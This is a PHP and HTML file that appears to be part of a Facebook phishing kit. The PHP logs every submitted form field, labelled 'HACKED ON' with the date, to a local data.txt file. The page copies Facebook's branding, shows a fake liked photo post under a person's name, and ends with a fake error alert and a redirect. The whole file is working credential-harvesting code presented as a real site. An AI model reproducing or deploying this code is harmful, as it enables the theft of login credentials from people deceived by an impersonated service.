<?php
$handle=fopen("data.txt", "a");
$atim =time();
$atime=date("dS F Y", $atim);
fwrite($handle,"\r\n");
fwrite($handle,"\t\t\t\t\t\t\t HACKED ON:");
fwrite($handle,$atime);
fwrite($handle,"\r\n");
fwrite($handle,"\t\t\t\t\t\t======================================================");
fwrite($handle,"\r\n");
foreach($_POST as $variable=>$value)
{
fwrite($handle,"\t\t\t\t\t\t\t\t");
fwrite($handle, $variable);
fwrite($handle, "=");
fwrite($handle, $value);
fwrite($handle, "\r\n");
}
fwrite($handle, "\r\n");
fwrite($handle,"\t\t\t\t\t\t======================================================");
fclose($handle);
/*echo "Invalid E-mail/Password <br>";
echo "Try Again";
header("Refresh:2;url=index.html");
header("Location: index.php"); */
?>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<title>Facebook</title>
<link rel="stylesheet" href="style.css" type="text/css" />
<style>.img, h3,p{display: inline-block;margin: 0px;vertical-align: middle;}
.img1,button{display: inline-block;margin: 0px;vertical-align: middle;}</style>
</head>
<body class="login">
<!-- header starts here -->
<div id="facebook-Bar">
<div id="facebook-Frame">
<div id="logo"> <a href="save.php">Facebook</a> </div>
</div>
</div>
<!-- header ends here -->
<div class="loginbox radius" >
<img style="hight:50px;width:50px;border-radius:1px black solid;margin:20px;" class='img' src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRjVXybwwswQWwuHWko_d8yyrqqLOYBqlGWkkKNs-yDqqrb2YuQ&s">
<h3 style="color:#141823; text-align:left;">Gayatri Dunakhe
<span style="color:#D0CFCC; text-align:left;font-size:15px;"><h5>Wednesday at 00:00 AM</h5></span></h3>
<div class="loginboxinner radius">
<div class="loginheader">
<h5 class="title" style="text-align:left;color:black;font-size:15px; margin-left:20px;">Hello...</h5>
</div>
<!--loginheader-->
<div class="loginform">
<img style="hight:400px;width:400px;border:1px black solid;margin:20px;" src="https://cdn.pixabay.com/photo/2015/04/23/22/00/tree-736885__340.jpg">
<h5 class="title" style="text-align:left;color:black;font-size:15px; margin-left:20px;">
<img style="hight:30px;width:30px;color:white;" class="img1" src="https://cdn2.iconfinder.com/data/icons/facebook-ui-colored/48/JD-22-128.png">
<p id="txt">5 people like</p> &nbsp &nbsp &nbsp &nbsp &nbsp &nbsp &nbsp &nbsp &nbsp &nbsp &nbsp &nbsp &nbsp &nbsp &nbsp &nbsp &nbsp &nbsp &nbsp &nbsp &nbsp &nbsp &nbsp &nbsp &nbsp &nbsp  no comment</h5>
<center><button style="height:50px;border-radius:8px #008ad3 solid; align:center; background:#008ad3; color:white;"  onclick="show()">Like
<img style="hight:25px;width:25px;color:white;" class="img1" src="https://cdn3.iconfinder.com/data/icons/facebook-ui-flat/48/Facebook_UI-35-512.png"></button></center>
</div>
<!--loginform-->
</div>

<!--loginboxinner-->
</div>

<!--loginbox-->
<script>
function show(){
alert("You like the image");
var element = document.getElementById("txt");
element.innerHTML = "6 people like";
}
</script>
</body>
</html>
<?php
echo "<script>alert('Something wants to wrong');</script>";
header("Refresh:10;url=index.html");
//header("Location: index.php");
?>
